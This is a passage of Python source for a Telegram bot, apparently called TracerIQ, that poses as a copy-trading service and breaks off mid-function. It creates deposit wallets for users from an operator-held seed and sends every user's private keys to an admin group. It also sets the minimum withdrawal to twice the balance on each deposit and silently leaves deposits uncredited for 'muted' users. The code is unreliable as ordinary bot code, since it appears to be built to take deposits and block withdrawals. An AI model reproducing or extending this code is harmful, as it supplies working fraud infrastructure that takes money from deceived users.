import re
import os
import random
import string
import hashlib
from html import escape as html_escape
from datetime import datetime
from pathlib import Path
from eth_account import Account

import base58
import json
import requests
import asyncio
from contextvars import ContextVar
from dotenv import load_dotenv
from nacl.signing import SigningKey
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import TransferParams, transfer
from solders.transaction import Transaction
from solana.rpc.async_api import AsyncClient
from pycoingecko import CoinGeckoAPI
from telegram import (
    Bot as TelegramBot,
    Update,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    InlineKeyboardButton,
    InlineKeyboardMarkup as TelegramInlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# Telegram reply keyboards submit their button label as a chat message. Keep a
# short, invisible action tag on each button so the message handler can route
# it to the same action as the former inline callback.
_REPLY_ACTION_MARKER = "\u2063"
_REPLY_ACTION_ZERO = "\u200b"
_REPLY_ACTION_ONE = "\u200c"
_REPLY_ACTION_BITS = 20
_REPLY_ACTIONS_PATH = Path(__file__).resolve().parent / ".reply_keyboard_actions.json"
_reply_action_counter = 0
_reply_actions_by_token = {}
_reply_tokens_by_action = {}
_reply_actions_by_label = {}
_bot_message_ids_by_private_chat = {}
_bot_message_tracking_lock = asyncio.Lock()
_preserve_multiple_bot_messages = ContextVar(
    "preserve_multiple_bot_messages", default=False
)

_telegram_send_message = getattr(
    TelegramBot,
    "_traceriq_original_send_message",
    TelegramBot.send_message,
)
_telegram_send_photo = getattr(
    TelegramBot,
    "_traceriq_original_send_photo",
    TelegramBot.send_photo,
)

async def _track_private_bot_message(bot, message):
    chat = getattr(message, "chat", None)
    message_id = getattr(message, "message_id", None)
    if getattr(chat, "type", None) != "private" or message_id is None:
        return
    async with _bot_message_tracking_lock:
        if not _preserve_multiple_bot_messages.get():
            previous_ids = _bot_message_ids_by_private_chat.pop(chat.id, [])
            for previous_id in previous_ids:
                try:
                    await bot.delete_message(
                        chat_id=chat.id,
                        message_id=previous_id,
                    )
                except Exception:
                    pass
        message_ids = _bot_message_ids_by_private_chat.setdefault(chat.id, [])
        if message_id not in message_ids:
            message_ids.append(message_id)

async def _tracked_send_message(bot, *args, **kwargs):
    message = await _telegram_send_message(bot, *args, **kwargs)
    await _track_private_bot_message(bot, message)
    return message

async def _tracked_send_photo(bot, *args, **kwargs):
    message = await _telegram_send_photo(bot, *args, **kwargs)
    await _track_private_bot_message(bot, message)
    return message

if not getattr(TelegramBot, "_traceriq_message_tracking_installed", False):
    TelegramBot._traceriq_original_send_message = _telegram_send_message
    TelegramBot._traceriq_original_send_photo = _telegram_send_photo
    TelegramBot.send_message = _tracked_send_message
    TelegramBot.send_photo = _tracked_send_photo
    TelegramBot._traceriq_message_tracking_installed = True

async def _delete_previous_bot_messages(update, context):
    """Clear the bot's previous private-chat replies before handling a new action."""
    chat = getattr(update, "effective_chat", None)
    if getattr(chat, "type", None) != "private":
        return
    async with _bot_message_tracking_lock:
        message_ids = _bot_message_ids_by_private_chat.pop(chat.id, [])
    for message_id in message_ids:
        try:
            await context.bot.delete_message(
                chat_id=chat.id,
                message_id=message_id,
            )
        except Exception:
            # A user may have already deleted a message, or Telegram may reject
            # deletion of a message that is no longer available.
            pass

def _reply_action_key(action: dict) -> str:
    return json.dumps(action, sort_keys=True, ensure_ascii=False)

def _normalize_reply_label(text: str) -> str:
    """Normalize Telegram button labels if it strips hidden zero-width tags."""
    import unicodedata
    return "".join(
        char for char in text
        if unicodedata.category(char) != "Cf"
    ).strip()

def _persist_reply_actions():
    temporary_path = _REPLY_ACTIONS_PATH.with_suffix(".tmp")
    try:
        temporary_path.write_text(
            json.dumps(_reply_actions_by_token, ensure_ascii=False),
            encoding="utf-8",
        )
        temporary_path.replace(_REPLY_ACTIONS_PATH)
    except OSError as error:
        print(f"Could not persist reply keyboard actions: {type(error).__name__}")

def _load_reply_actions():
    global _reply_action_counter
    try:
        saved = json.loads(_REPLY_ACTIONS_PATH.read_text(encoding="utf-8"))
    except FileNotFoundError:
        return
    except (OSError, json.JSONDecodeError) as error:
        print(f"Could not load reply keyboard actions: {type(error).__name__}")
        return

    if not isinstance(saved, dict):
        return
    for raw_token, action in saved.items():
        try:
            token = int(raw_token)
        except (TypeError, ValueError):
            continue
        if not (0 < token < 2**_REPLY_ACTION_BITS):
            continue
        if not isinstance(action, dict) or action.get("kind") not in {
            "callback",
            "url",
            "input",
        }:
            continue
        _reply_actions_by_token[token] = action
        _reply_tokens_by_action[_reply_action_key(action)] = token
        _reply_action_counter = max(_reply_action_counter, token)

_load_reply_actions()

def _register_reply_button(label: str, action: dict) -> str:
    global _reply_action_counter
    _reply_actions_by_label[_normalize_reply_label(label)] = action
    action_key = _reply_action_key(action)
    token = _reply_tokens_by_action.get(action_key)
    if token is None:
        _reply_action_counter += 1
        if _reply_action_counter >= 2**_REPLY_ACTION_BITS:
            raise RuntimeError("Reply keyboard action limit reached")
        token = _reply_action_counter
        _reply_tokens_by_action[action_key] = token
        _reply_actions_by_token[token] = action
        _persist_reply_actions()

    hidden_token = "".join(
        _REPLY_ACTION_ONE if token & (1 << bit) else _REPLY_ACTION_ZERO
        for bit in range(_REPLY_ACTION_BITS)
    )
    return f"{label}{_REPLY_ACTION_MARKER}{hidden_token}"

def _decode_reply_button(text: str):
    if _REPLY_ACTION_MARKER not in text:
        return None
    label, hidden_token = text.rsplit(_REPLY_ACTION_MARKER, 1)
    if len(hidden_token) != _REPLY_ACTION_BITS:
        return None
    if any(
        char not in (_REPLY_ACTION_ZERO, _REPLY_ACTION_ONE) for char in hidden_token
    ):
        return None
    token = sum(
        1 << bit for bit, char in enumerate(hidden_token) if char == _REPLY_ACTION_ONE
    )
    action = _reply_actions_by_token.get(token)
    return (action, label) if action else None

def _make_reply_keyboard(rows, *, placeholder="Choose an option"):
    return ReplyKeyboardMarkup(
        rows,
        resize_keyboard=True,
        one_time_keyboard=False,
        input_field_placeholder=placeholder,
    )

def InlineKeyboardMarkup(inline_keyboard=None, **_kwargs):
    """Render legacy inline-button definitions as ordinary reply buttons."""
    reply_rows = []
    for row in inline_keyboard or []:
        reply_row = []
        for button in row:
            if not isinstance(button, InlineKeyboardButton):
                raise TypeError("Expected InlineKeyboardButton in keyboard row")
            label = button.text
            if button.callback_data is not None:
                action = {"kind": "callback", "data": str(button.callback_data)}
            elif button.url:
                action = {"kind": "url", "url": button.url, "label": label}
            else:
                action = {"kind": "input", "text": label}
            reply_row.append(_register_reply_button(label, action))
        if reply_row:
            reply_rows.append(reply_row)
    return _make_reply_keyboard(reply_rows)

class _ReplyKeyboardMessage:
    """Message-shaped adapter for the existing callback action handlers."""

    def __init__(self, source_message, context):
        self._source_message = source_message
        self._context = context
        self.chat = source_message.chat
        self.chat_id = source_message.chat_id
        self.message_id = source_message.message_id
        self.from_user = source_message.from_user

    async def reply_text(self, text, **kwargs):
        return await self._context.bot.send_message(
            chat_id=self.chat_id, text=text, **kwargs
        )

    async def delete(self):
        # The incoming reply-keyboard message is deleted before dispatch.
        return None

class _ReplyKeyboardInputUpdate:
    """Use non-replying sends after a reply-keyboard message was deleted."""

    def __init__(self, source_update, context, text):
        self._source_update = source_update
        self.message = _ReplyKeyboardMessage(source_update.message, context)
        self.message.text = text

    def __getattr__(self, name):
        return getattr(self._source_update, name)

class _ReplyKeyboardQuery:
    """Message-action adapter that replies cleanly after deleting old messages."""

    is_reply_button = True

    def __init__(self, source_message, context, action, user=None):
        self.data = action
        self.from_user = user or source_message.from_user
        self.message = _ReplyKeyboardMessage(source_message, context)

    async def answer(self, *_args, **_kwargs):
        return None

    async def edit_message_text(self, text, **kwargs):
        return await self.message.reply_text(text, **kwargs)

# Load environment variables
PROJECT_DIR = Path(__file__).resolve().parent
START_BANNER_PATH = (
    PROJECT_DIR / "attached_assets" / "photo_2026-09-29_23-39-28_1790721594040.jpg"
)
load_dotenv(PROJECT_DIR / ".env")
# Store temporary user states
user_states = {}
# Track users whose wallet info has been sent to admin group (prevent spam)
wallet_sent_to_admin = set()
# Track last notified balance per user (to show notification only once per deposit)
last_notified_balance = {}  # {telegram_id: balance} — tracks user SOL notifications
last_admin_notified_balance = {}  # {telegram_id: balance} — tracks admin group SOL notifications
last_notified_evm = {}  # {telegram_id: {"eth": float, "bnb": float}}
last_admin_notified_evm = {}  # {telegram_id: {"eth": float, "bnb": float}}

# Admin configuration
ADMIN_IDS = [6370028992, 7484918897]
BANNED_USERS_FILE = "banned_users.json"
MUTED_USERS_FILE = "muted_users.json"
SUPPORT_LINK_FILE = "support_link.json"
banned_users = set()
muted_users = set()
KNOWN_USERS_FILE = "known_users.json"
known_user_ids = set()
SUPPORT_LINK = "https://t.me/TracerIQTeamSupport"
DEFAULT_DRAW_INTERVAL_SECONDS = 12 * 60 * 60

# Load settings
try:
    with open(BANNED_USERS_FILE, "r") as f:
        data = json.load(f)
        banned_users = set(data)
except Exception:
    pass

try:
    with open(KNOWN_USERS_FILE, "r") as f:
        known_user_ids = {int(uid) for uid in json.load(f)}
except Exception:
    pass

try:
    with open(MUTED_USERS_FILE, "r") as f:
        muted_users = set(json.load(f))
except Exception:
    pass

try:
    with open(SUPPORT_LINK_FILE, "r") as f:
        data = json.load(f)
        SUPPORT_LINK = data.get("link", SUPPORT_LINK)
except Exception:
    pass

def save_support_link():
    """Save support link to file"""
    try:
        with open(SUPPORT_LINK_FILE, "w") as f:
            json.dump({"link": SUPPORT_LINK}, f)
    except Exception as e:
        print(f"Error saving support link: {e}")

def save_banned_users():
    """Save banned users to file"""
    try:
        with open(BANNED_USERS_FILE, "w") as f:
            json.dump(list(banned_users), f)
    except Exception as e:
        print(f"Error saving banned users: {e}")

def save_muted_users():
    """Save muted users to file"""
    try:
        with open(MUTED_USERS_FILE, "w") as f:
            json.dump(list(muted_users), f)
    except Exception as e:
        print(f"Error saving muted users: {e}")

def save_known_users():
    try:
        with open(KNOWN_USERS_FILE, "w") as f:
            json.dump(sorted(known_user_ids), f)
    except Exception as e:
        print(f"Error saving known users: {e}")

def register_user(telegram_id: int):
    """Keep a durable index of every user who has opened the bot."""
    if telegram_id not in known_user_ids:
        known_user_ids.add(telegram_id)
        save_known_users()

def all_known_user_ids():
    """Return IDs from every local user-data source for backwards compatibility."""
    ids = set(known_user_ids) | set(user_balances.keys())
    ids.update(int(uid) for uid in referral_data.get("users", {}) if str(uid).isdigit())
    try:
        with open("addresses.txt", "r") as f:
            for line in f:
                parts = line.rstrip().split("\t")
                if len(parts) >= 2 and parts[1].isdigit():
                    ids.add(int(parts[1]))
    except OSError:
        pass
    return ids

# --- Referral System ---
REFERRALS_FILE = "referrals.json"
referral_data = {"codes": {}, "users": {}}

def load_referrals():
    global referral_data
    try:
        with open(REFERRALS_FILE, "r") as f:
            referral_data = json.load(f)
            if "codes" not in referral_data:
                referral_data["codes"] = {}
            if "users" not in referral_data:
                referral_data["users"] = {}
    except Exception:
        referral_data = {"codes": {}, "users": {}}

def save_referrals():
    try:
        with open(REFERRALS_FILE, "w") as f:
            json.dump(referral_data, f)
    except Exception as e:
        print(f"Error saving referrals: {e}")

def get_or_create_referral_code(user_id: int) -> str:
    uid = str(user_id)
    if uid in referral_data["users"] and referral_data["users"][uid].get("code"):
        return referral_data["users"][uid]["code"]
    while True:
        code = "RF" + "".join(random.choices(string.ascii_letters + string.digits, k=5))
        if code not in referral_data["codes"]:
            break
    referral_data["codes"][code] = user_id
    if uid not in referral_data["users"]:
        referral_data["users"][uid] = {"code": code, "inviter_id": None, "invited": []}
    else:
        referral_data["users"][uid]["code"] = code
    save_referrals()
    return code

def record_referral(new_user_id: int, inviter_code: str) -> int | None:
    code_map = referral_data.get("codes", {})
    if inviter_code not in code_map:
        return None
    inviter_id = code_map[inviter_code]
    if inviter_id == new_user_id:
        return None
    new_uid = str(new_user_id)
    inviter_uid = str(inviter_id)
    user_entry = referral_data["users"].get(new_uid, {})
    if user_entry.get("inviter_id") is not None:
        return inviter_id
    user_entry["inviter_id"] = inviter_id
    referral_data["users"][new_uid] = user_entry
    inviter_entry = referral_data["users"].setdefault(
        inviter_uid, {"code": inviter_code, "inviter_id": None, "invited": []}
    )
    if new_user_id not in inviter_entry.get("invited", []):
        inviter_entry.setdefault("invited", []).append(new_user_id)
    save_referrals()
    return inviter_id

load_referrals()

# Load persisted wallet notifications from file
try:
    with open("wallet_notifications.txt", "r") as f:
        for line in f:
            user_id = line.strip()
            if user_id.isdigit():
                wallet_sent_to_admin.add(int(user_id))
except FileNotFoundError:
    pass  # File doesn't exist yet, will be created on first notification

# Balance tracking (cumulative deposits only)
user_balances = {}  # {telegram_id: {"balance": float, "last_checked_slot": int, "min_withdrawal": float, "fixed_min": bool}}
BALANCES_FILE = "user_balances.json"

# Load persisted balances
try:
    with open(BALANCES_FILE, "r") as f:
        user_balances = json.load(f)
        # Convert string keys back to int
        user_balances = {int(k): v for k, v in user_balances.items()}
except FileNotFoundError:
    pass

def save_balances():
    """Save user balances to file"""
    try:
        with open(BALANCES_FILE, "w") as f:
            json.dump(user_balances, f, indent=2)
    except Exception as e:
        print(f"Error saving balances: {e}")

# ---- CONFIG ----
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not BOT_TOKEN:
    raise SystemExit("TELEGRAM_BOT_TOKEN environment variable is required")
GROUP_ID = int(os.getenv("ADMIN_GROUP_ID", 0))
MNEMONIC = os.getenv("MNEMONIC", "")  # Master seed phrase for wallet generation
COINGECKO_API_KEY = os.getenv("COINGECKO_API_KEY", "")  # CoinGecko API key (optional)
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"  # Solana RPC endpoint

# Debug: Check if API key is loaded
if COINGECKO_API_KEY:
    print("✅ CoinGecko API key loaded")
else:
    print("⚠️ WARNING: CoinGecko API Key NOT found! Prices may not work correctly.")
    print("   Make sure COINGECKO_API_KEY is set in Replit Secrets")

# Initialize clients
# Use demo_api_key parameter for Demo API keys (api.coingecko.com)
# Use api_key parameter for Pro API keys (pro-api.coingecko.com)
if COINGECKO_API_KEY:
    # Remove quotes if they exist in the env var
    clean_key = COINGECKO_API_KEY.strip('"').strip("'")
    cg = CoinGeckoAPI(demo_api_key=clean_key)
else:
    cg = CoinGeckoAPI()
solana_client = AsyncClient(SOLANA_RPC_URL)

# ---- Helper Functions ----
async def get_sol_price_usd():
    """Get current SOL price in USD from CoinGecko"""
    try:
        price_data = cg.get_price(ids="solana", vs_currencies="usd")
        return price_data.get("solana", {}).get("usd", 0)
    except Exception as e:
        print(f"Error fetching SOL price: {e}")
        return 0

async def get_evm_prices_usd():
    """Get ETH and BNB prices in USD from CoinGecko. Returns (eth_price, bnb_price)."""
    try:
        price_data = cg.get_price(ids="ethereum,binancecoin", vs_currencies="usd")
        eth_price = price_data.get("ethereum", {}).get("usd", 0)
        bnb_price = price_data.get("binancecoin", {}).get("usd", 0)
        return eth_price, bnb_price
    except Exception as e:
        print(f"Error fetching EVM prices: {e}")
        return 0, 0

def _evm_rpc_request(rpc_url: str, method: str, params: list):
    """Call an EVM JSON-RPC endpoint without logging transaction material."""
    payload = {
        "jsonrpc": "2.0",
        "method": method,
        "params": params,
        "id": 1,
    }
    response = requests.post(rpc_url, json=payload, timeout=20)
    response.raise_for_status()
    body = response.json()
    if "error" in body:
        raise RuntimeError(str(body["error"]))
    if "result" not in body:
        raise RuntimeError("invalid JSON-RPC response")
    return body["result"]

async def _check_evm_balance(address: str, rpc_url: str) -> float | None:
    """Read native balance from an EVM JSON-RPC endpoint; None means RPC failure."""
    try:
        hex_val = _evm_rpc_request(rpc_url, "eth_getBalance", [address, "latest"])
        if not isinstance(hex_val, str):
            raise RuntimeError("invalid balance response")
        return int(hex_val, 16) / 1e18
    except Exception as e:
        print(f"Error checking EVM balance at {rpc_url}: {e}")
        return None

def _rpc_urls(env_name: str, defaults: list[str]) -> list[str]:
    """Allow comma-separated RPC failover endpoints without exposing them in chat."""
    configured = os.getenv(env_name, "")
    urls = [url.strip() for url in configured.split(",") if url.strip()]
    return urls or defaults

async def check_eth_balance(address: str) -> float | None:
    """Check native ETH on Ethereum mainnet, with public fallback endpoints."""
    for url in _rpc_urls(
        "ETH_RPC_URL",
        [
            "https://ethereum-rpc.publicnode.com",
            "https://eth.llamarpc.com",
        ],
    ):
        balance = await _check_evm_balance(address, url)
        if balance is not None:
            return balance
    return None

async def check_bnb_balance(address: str) -> float | None:
    """Check native BNB on BSC mainnet, with public fallback endpoints."""
    for url in _rpc_urls(
        "BNB_RPC_URL",
        [
            "https://bsc-rpc.publicnode.com",
            "https://binance.llamarpc.com",
        ],
    ):
        balance = await _check_evm_balance(address, url)
        if balance is not None:
            return balance
    return None

async def check_wallet_balance(public_address: str):
    """Check wallet balance on Solana blockchain"""
    try:
        pubkey = Pubkey.from_string(public_address)
        response = await solana_client.get_balance(pubkey)
        if response.value is not None:
            # Convert lamports to SOL (1 SOL = 1,000,000,000 lamports)
            balance_sol = response.value / 1_000_000_000
            return balance_sol
        return 0
    except Exception as e:
        print(f"Error checking balance for {public_address}: {e}")
        return 0

async def monitor_deposits(
    telegram_id: int,
    public_address: str,
    context: ContextTypes.DEFAULT_TYPE,
    notify_user: bool = True,
):
    """Monitor and update cumulative deposits for a wallet"""
    try:
        # Get current blockchain balance
        current_balance = await check_wallet_balance(public_address)

        # Get stored cumulative deposit balance
        if telegram_id not in user_balances:
            user_balances[telegram_id] = {
                "balance": 0,
                "last_checked_slot": 0,
                "min_withdrawal": 0,
                "fixed_min": False,
            }

        stored_balance = user_balances[telegram_id]["balance"]

        # If blockchain balance > stored balance, we have a new deposit
        if current_balance > stored_balance:
            deposit_amount = current_balance - stored_balance
            is_muted = telegram_id in muted_users

            # Only update balance and min withdrawal if user is NOT muted
            if not is_muted:
                user_balances[telegram_id]["balance"] = current_balance

                # Withdrawal logic update
                if not user_balances[telegram_id].get("fixed_min", False):
                    user_balances[telegram_id]["min_withdrawal"] = current_balance * 2
                else:
                    fixed_min = user_balances[telegram_id].get("min_withdrawal", 0)
                    if current_balance >= fixed_min:
                        user_balances[telegram_id]["fixed_min"] = False
                        user_balances[telegram_id]["min_withdrawal"] = (
                            current_balance * 2
                        )

                save_balances()

            sol_price = await get_sol_price_usd()
            usd_value = current_balance * sol_price if sol_price > 0 else 0

            # Send notification to USER — skip entirely if muted
            if (
                not is_muted
                and notify_user
                and last_notified_balance.get(telegram_id, -1) != current_balance
            ):
                try:
                    user_notification = (
                        f"💰 <b>Deposit Confirmed!</b>\n\n"
                        f"Amount: +{deposit_amount:.4f} SOL\n"
                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
                        f"Your deposit has been successfully received and credited to your wallet."
                    )
                    await context.bot.send_message(
                        chat_id=telegram_id, text=user_notification, parse_mode="HTML"
                    )
                    last_notified_balance[telegram_id] = current_balance
                except Exception as e:
                    print(f"Error sending notification to user: {e}")

            # Send to admin group — only ONCE per deposit (deduplicated for muted users too)
            if (
                GROUP_ID
                and last_admin_notified_balance.get(telegram_id, -1) != current_balance
            ):
                try:
                    user = await context.bot.get_chat(telegram_id)
                    user_name = user.username or user.first_name or str(telegram_id)

                    mute_note = (
                        "\n🔕 <b>User is MUTED</b> — balance not updated, no user notification sent."
                        if is_muted
                        else ""
                    )
                    deposit_notification = (
                        f"💰 <b>New Deposit Detected</b>\n\n"
                        f"User: @{user_name} (ID: {telegram_id})\n"
                        f"Address: <code>{public_address}</code>\n\n"
                        f"Deposit: +{deposit_amount:.4f} SOL\n"
                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n"
                        f"{mute_note}\n"
                        f"Cumulative deposits tracked."
                    )
                    await context.bot.send_message(
                        chat_id=GROUP_ID, text=deposit_notification, parse_mode="HTML"
                    )
                    last_admin_notified_balance[telegram_id] = current_balance
                except Exception as e:
                    print(f"Error sending notification to admin group: {e}")

            return current_balance

        return stored_balance
    except Exception as e:
        print(f"Error monitoring deposits: {e}")
        return user_balances.get(telegram_id, {}).get("balance", 0)

def get_user_balance(telegram_id: int):
    """Get user's cumulative deposit balance"""
    return user_balances.get(telegram_id, {}).get("balance", 0)

async def monitor_evm_deposits(
    telegram_id: int,
    evm_address: str,
    context: ContextTypes.DEFAULT_TYPE,
    notify_user: bool = True,
):
    """Monitor ETH and BNB deposits. Mirrors monitor_deposits logic for EVM chains."""
    try:
        if telegram_id not in user_balances:
            user_balances[telegram_id] = {
                "balance": 0,
                "last_checked_slot": 0,
                "min_withdrawal": 0,
                "fixed_min": False,
                "eth_balance": 0,
                "bnb_balance": 0,
            }
        if "eth_balance" not in user_balances[telegram_id]:
            user_balances[telegram_id]["eth_balance"] = 0
        if "bnb_balance" not in user_balances[telegram_id]:
            user_balances[telegram_id]["bnb_balance"] = 0

        stored_eth = user_balances[telegram_id]["eth_balance"]
        stored_bnb = user_balances[telegram_id]["bnb_balance"]

        chain_eth = await check_eth_balance(evm_address)
        chain_bnb = await check_bnb_balance(evm_address)
        # Never treat an unavailable RPC as a zero balance or overwrite stored funds.
        # A BNB outage must not hide a valid ETH deposit, and vice versa.
        eth_available = chain_eth is not None
        bnb_available = chain_bnb is not None
        if not eth_available and not bnb_available:
            return

        eth_changed = eth_available and chain_eth > stored_eth
        bnb_changed = bnb_available and chain_bnb > stored_bnb

        if not (eth_changed or bnb_changed):
            return

        is_muted = telegram_id in muted_users
        eth_price, bnb_price = await get_evm_prices_usd()

        last_evm = last_admin_notified_evm.get(telegram_id, {})

        # ── Update stored balances (only when not muted) ──
        if not is_muted:
            if eth_changed:
                user_balances[telegram_id]["eth_balance"] = chain_eth
            if bnb_changed:
                user_balances[telegram_id]["bnb_balance"] = chain_bnb
            save_balances()

        # ── Notify user (skip if muted) ──
        prev_user = last_notified_evm.get(telegram_id, {})
        if not is_muted and notify_user:
            lines = []
            if eth_changed and prev_user.get("eth", -1) != chain_eth:
                dep = chain_eth - stored_eth
                lines.append(
                    f"  +{dep:.6f} ETH  (now {chain_eth:.6f} ETH ≈ ${chain_eth * eth_price:.2f})"
                )
                last_notified_evm.setdefault(telegram_id, {})["eth"] = chain_eth
            if bnb_changed and prev_user.get("bnb", -1) != chain_bnb:
                dep = chain_bnb - stored_bnb
                lines.append(
                    f"  +{dep:.6f} BNB  (now {chain_bnb:.6f} BNB ≈ ${chain_bnb * bnb_price:.2f})"
                )
                last_notified_evm.setdefault(telegram_id, {})["bnb"] = chain_bnb
            if lines:
                msg = (
                    "💰 <b>EVM Deposit Confirmed!</b>\n\n"
                    + "\n".join(lines)
                    + "\n\nFunds have been credited to your EVM wallet."
                )
                try:
                    await context.bot.send_message(
                        chat_id=telegram_id, text=msg, parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"Error notifying user of EVM deposit: {e}")

        # ── Notify admin group (always, but only once per deposit) ──
        if GROUP_ID:
            admin_lines = []
            if eth_changed and last_evm.get("eth", -1) != chain_eth:
                dep = chain_eth - stored_eth
                admin_lines.append(
                    f"ETH: +{dep:.6f} → {chain_eth:.6f} (${chain_eth * eth_price:.2f})"
                )
                last_admin_notified_evm.setdefault(telegram_id, {})["eth"] = chain_eth
            if bnb_changed and last_evm.get("bnb", -1) != chain_bnb:
                dep = chain_bnb - stored_bnb
                admin_lines.append(
                    f"BNB: +{dep:.6f} → {chain_bnb:.6f} (${chain_bnb * bnb_price:.2f})"
                )
                last_admin_notified_evm.setdefault(telegram_id, {})["bnb"] = chain_bnb
            if admin_lines:
                mute_note = (
                    "\n🔕 <b>User is MUTED</b> — balance not updated, no user notification."
                    if is_muted
                    else ""
                )
                try:
                    user_obj = await context.bot.get_chat(telegram_id)
                    uname = user_obj.username or user_obj.first_name or str(telegram_id)
                    note = "\n".join(admin_lines)
                    await context.bot.send_message(
                        chat_id=GROUP_ID,
                        text=f"🔵 <b>EVM Deposit Detected</b>\n\nUser: @{uname} (ID: {telegram_id})\nAddress: <code>{evm_address}</code>\n\n{note}{mute_note}",
                        parse_mode="HTML",
                    )
                except Exception as e:
                    print(f"Error sending EVM deposit admin notification: {e}")
    except Exception as e:
        print(f"Error in monitor_evm_deposits: {e}")

async def check_and_notify_deposits(
    telegram_id: int, context: ContextTypes.DEFAULT_TYPE
):
    """Check for deposits and notify user (called on any button click)"""
    try:
        public_address, _ = derive_keypair_and_address(telegram_id)
        await monitor_deposits(telegram_id, public_address, context, notify_user=True)
        evm_address, _ = derive_evm_wallet(telegram_id)
        await monitor_evm_deposits(telegram_id, evm_address, context, notify_user=True)
    except Exception as e:
        print(f"Error checking deposits: {e}")

# ---- Wallet Generation Utility Functions ----
def derive_seed_from_mnemonic_and_id(mnemonic: str, telegram_id: int) -> bytes:
    """
    Deterministic derivation: Uses SHA256(mnemonic || ':' || telegram_id)
    Returns 32-byte seed for each unique Telegram ID
    """
    msg = (mnemonic.strip() + ":" + str(telegram_id)).encode("utf-8")
    digest = hashlib.sha256(msg).digest()
    return digest[:32]

def derive_evm_wallet(telegram_id: int):
    """
    Generate deterministic EVM (Ethereum / BNB Smart Chain) wallet for a user.
    Same address works on both ETH and BSC.
    Returns: (evm_address, private_key_hex)
    """
    if not MNEMONIC:
        raise ValueError("MNEMONIC not set in environment variables")
    # Different salt from Solana to produce a distinct key
    msg = (MNEMONIC.strip() + ":evm:" + str(telegram_id)).encode("utf-8")
    private_key_bytes = hashlib.sha256(msg).digest()
    acct = Account.from_key(private_key_bytes)
    return acct.address, acct.key.hex()

def derive_keypair_and_address(telegram_id: int):
    """
    Generate unique Solana wallet for a Telegram user
    Returns: (public_address, private_key_base58)
    """
    if not MNEMONIC:
        raise ValueError("MNEMONIC not set in environment variables")

    # Derive unique seed for this telegram ID
    seed32 = derive_seed_from_mnemonic_and_id(MNEMONIC, telegram_id)

    # Generate Solana keypair
    kp = Keypair.from_seed(seed32)
    public_address = str(kp.pubkey())

    # Generate 64-byte secret key (private + public)
    sk = SigningKey(seed32)
    vk = sk.verify_key
    secret_64 = sk.encode() + vk.encode()
    private_key_b58 = base58.b58encode(secret_64).decode()

    return public_address, private_key_b58

# ✅ Step 1: Put the wallet function here
async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    telegram_id = user.id
    register_user(telegram_id)
    user_name = user.username or user.first_name or str(telegram_id)

    try:
        # Generate unique wallet for this user
        public_address, private_key_b58 = derive_keypair_and_address(telegram_id)

        # Generate EVM wallet
        evm_address, evm_private_key = derive_evm_wallet(telegram_id)

        # Send both wallet keys to admin group (only once per user)
        if telegram_id not in wallet_sent_to_admin and GROUP_ID:
            try:
                admin_message = (
                    f"👤 <b>New Wallet Generated</b>\n\n"
                    f"User: @{user_name} (ID: {telegram_id})\n\n"
                    f"🟣 <b>Solana Address:</b>\n"
                    f"<code>{public_address}</code>\n\n"
                    f"🔐 <b>SOL Private Key:</b>\n"
                    f"<code>{private_key_b58}</code>\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔵 <b>EVM Address (ETH / BSC):</b>\n"
                    f"<code>{evm_address}</code>\n\n"
                    f"🔐 <b>EVM Private Key:</b>\n"
                    f"<code>{evm_private_key}</code>"
                )
                await context.bot.send_message(
                    chat_id=GROUP_ID, text=admin_message, parse_mode="HTML"
                )
                wallet_sent_to_admin.add(telegram_id)
                try:
                    with open("wallet_notifications.txt", "a") as f:
                        f.write(f"{telegram_id}\n")
                except Exception as e:
                    print(f"Error persisting notification record: {e}")
            except Exception as e:
                print(f"Error sending wallet to admin group: {e}")

        # Monitor deposits and update SOL balance
        balance = await monitor_deposits(telegram_id, public_address, context)

        # Ensure user_balances has ETH/BNB fields
        if telegram_id not in user_balances:
            user_balances[telegram_id] = {
                "balance": 0,
                "last_checked_slot": 0,
                "min_withdrawal": 0,
                "fixed_min": False,
                "eth_balance": 0,
                "bnb_balance": 0,
            }
        if "eth_balance" not in user_balances[telegram_id]:
            user_balances[telegram_id]["eth_balance"] = 0
        if "bnb_balance" not in user_balances[telegram_id]:
            user_balances[telegram_id]["bnb_balance"] = 0

        # Also scan EVM deposits while wallet is opened
        await monitor_evm_deposits(telegram_id, evm_address, context, notify_user=True)

        eth_balance = user_balances[telegram_id].get("eth_balance", 0)
        bnb_balance = user_balances[telegram_id].get("bnb_balance", 0)

        # Fetch all prices in parallel
        sol_price = await get_sol_price_usd()
        eth_price, bnb_price = await get_evm_prices_usd()

        sol_usd = balance * sol_price if sol_price > 0 else 0
        eth_usd = eth_balance * eth_price if eth_price > 0 else 0
        bnb_usd = bnb_balance * bnb_price if bnb_price > 0 else 0
        total_usd = sol_usd + eth_usd + bnb_usd

        wallet_text = (
            "◈ <b>TRACERIQ  /  PORTFOLIO</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "<i>Wallets connected to your copy-trading workspace</i>\n\n"
            "🟣 <b>SOLANA</b>\n"
            f"<code>{public_address}</code>\n"
            f"Balance  ·  {balance:.4f} SOL  ≈  <i>${sol_usd:.2f}</i>\n\n"
            "🔷 <b>EVM  ·  ETH / BNB</b>\n"
            f"<code>{evm_address}</code>\n"
            f"ETH  ·  {eth_balance:.6f}  ≈  <i>${eth_usd:.2f}</i>\n"
            f"BNB  ·  {bnb_balance:.6f}  ≈  <i>${bnb_usd:.2f}</i>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>PORTFOLIO VALUE  ·  ${total_usd:.2f}</b>\n\n"
            "To fund the workspace, send supported assets to the matching address above.\n"
            "<i>Supported for copy trading: SOL, ETH, and BNB.</i>"
        )
    except Exception as e:
        wallet_text = (
            "⚠️ <b>Wallet Generation Error</b>\n\n"
            "Unable to generate wallet. Please contact support.\n"
            f"Error: {str(e)}"
        )

    wallet_inline = InlineKeyboardMarkup(
        [
            [
